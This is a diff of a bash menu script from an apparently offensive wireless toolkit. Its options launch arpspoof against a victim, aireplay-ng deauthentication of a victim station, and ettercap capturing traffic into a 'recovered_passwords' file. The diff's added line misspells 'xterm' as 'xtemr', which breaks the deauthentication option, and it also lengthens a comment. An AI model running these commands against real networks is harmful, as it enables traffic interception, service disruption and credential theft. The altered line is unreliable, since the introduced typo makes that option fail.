@@ -94,7 +94,7 @@ menu()
 		  sudo xterm -bg black -fg DodgerBlue1 -T "ArpSpoof" -geometry 90x20 -e "bash -ic \"arpspoof -i $IFACE1 $ARP_VICTIM ; bash\"" &>/dev/null & #sudo xterm -T "Arpspoof $IFACE1 $AP_GATEWAY" -geometry 90x15 -e arpspoof -i $IFACE1 $ARP_VICTIM &>/dev/null &
 	      fi
 	     6) sudo xterm -bg black -fg DodgerBlue1 -T "iptables" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./firewall ; bash\"" &>/dev/null &
-	     7) sudo xterm -bg black -fg DodgerBlue1 -T "Aireplay" -geometry 90x20 -e "bash -ic \"aireplay-ng --deauth 1 -a $VICTIM_BSSID -c $STATION ${IFACE1}mon ; bash\"" &>/dev/null &
+	     7) sudo xtemr -bg black -fg DodgerBlue1 -T "Aireplay" -geometry 90x20 -e "bash -ic \"aireplay-ng --deauth 1 -a $VICTIM_BSSID -c $STATION ${IFACE1}mon ; bash\"" &>/dev/null &
 	     8) [[ ! -f ${SESSIONFOLDER}recovered_passwords.pcap ]] && sudo touch ${SESSIONFOLDER}recovered_passwords.pcap
 		if [[ $BRIDGED == "True" ]]; then
 		  sudo xterm -bg black -fg DodgerBlue1 -T "ettercap" -geometry 90x20 -e "bash -ic \"ettercap ${ETTERCAP_OPTIONS} -i ${BR_NAME} ; bash\"" &>/dev/null &
@@ -124,7 +124,7 @@ menu()
                 VAR=$(echo "$CHOICE" | cut -d ' ' -f 1)
                 STR=$(echo "$CHOICE" | cut -d ' ' -f 2)
                 printf ${VAR}=${STR}
-		#Don't know how to make this work yet inside memory.
+		#Don't know how to make this work yet inside memory. Trying to avoid using sed replace and reload of config every option change.
             else
                 printf %s "$($CHOICE)"
                 echo -e "\n\n"
